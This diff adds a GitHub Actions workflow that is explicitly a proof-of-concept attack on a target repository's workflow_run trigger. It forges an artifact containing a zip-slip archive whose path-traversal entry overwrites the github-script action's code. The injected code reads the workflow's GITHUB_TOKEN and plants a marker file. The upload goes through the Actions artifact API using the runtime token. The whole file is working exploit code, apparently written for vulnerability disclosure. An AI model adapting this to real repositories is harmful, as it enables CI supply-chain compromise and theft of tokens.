@@ -1,0 +1,76 @@
+name: Check External Links
+
+# PoC stand-in for the attacker-controlled upstream run whose name the target's
+# workflow_run trigger watches (a fork PR can supply a workflow with this name).
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  forge:
+    name: Forge attacker artifact
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - name: Upload crafted zip as artifact pr-findings-ext-links
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import os, json, hashlib, base64, zipfile, urllib.request
+
+          token = os.environ['ACTIONS_RUNTIME_TOKEN']
+          base = os.environ['ACTIONS_RESULTS_URL'].rstrip('/')
+          p = token.split('.')[1]
+          p += '=' * (-len(p) % 4)
+          scp = json.loads(base64.urlsafe_b64decode(p))['scp']
+          scope = [s for s in scp.split(' ') if s.startswith('Actions.Results:')][0]
+          _, run_backend, job_backend = scope.split(':')
+
+          sha = '3a2844b7e9c422d3c10d287c895573f7108da1b3'
+          payload = (
+            "const fs = require('fs');\n"
+            "const t = process.env.INPUT_GITHUB_TOKEN || '';\n"
+            "console.log('::notice::PWNED via artifact zip-slip: replaced github-script dist/index.js, token len=' + t.length);\n"
+            "try { fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/PWNED.txt', 'PWNED tokenlen=' + t.length + '\\n'); } catch (e) { console.log('marker write failed: ' + e.message); }\n"
+          )
+
+          entry = 'a/../../../../_actions/actions/github-script/%s/dist/index.js' % sha
+          with zipfile.ZipFile('/tmp/evil.zip', 'w', zipfile.ZIP_DEFLATED) as z:
+              z.writestr(entry, payload)
+          data = open('/tmp/evil.zip', 'rb').read()
+          print('zip entry:', entry, 'size:', len(data))
+
+          def twirp(method, body):
+              req = urllib.request.Request(
+                  base + '/twirp/github.actions.results.api.v1.ArtifactService/' + method,
+                  data=json.dumps(body).encode(),
+                  headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token},
+                  method='POST')
+              with urllib.request.urlopen(req, timeout=60) as r:
+                  return json.loads(r.read())
+
+          c = twirp('CreateArtifact', {
+              'workflow_run_backend_id': run_backend,
+              'workflow_job_run_backend_id': job_backend,
+              'name': 'pr-findings-ext-links',
+              'mime_type': {'value': 'application/zip'},
+              'version': 7})
+          print('CreateArtifact:', c.get('ok'), 'artifact_id=', c.get('artifact_id'))
+
+          up = urllib.request.Request(c['signed_upload_url'], data=data, method='PUT',
+              headers={'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip',
+                       'x-ms-blob-content-type': 'application/zip'})
+          with urllib.request.urlopen(up, timeout=120) as r:
+              print('blob PUT:', r.status)
+
+          f = twirp('FinalizeArtifact', {
+              'workflow_run_backend_id': run_backend,
+              'workflow_job_run_backend_id': job_backend,
+              'name': 'pr-findings-ext-links',
+              'size': str(len(data)),
+              'hash': {'value': 'sha256:' + hashlib.sha256(data).hexdigest()}})
+          print('FinalizeArtifact:', f.get('ok'), 'artifact_id=', f.get('artifact_id'))
+          PY
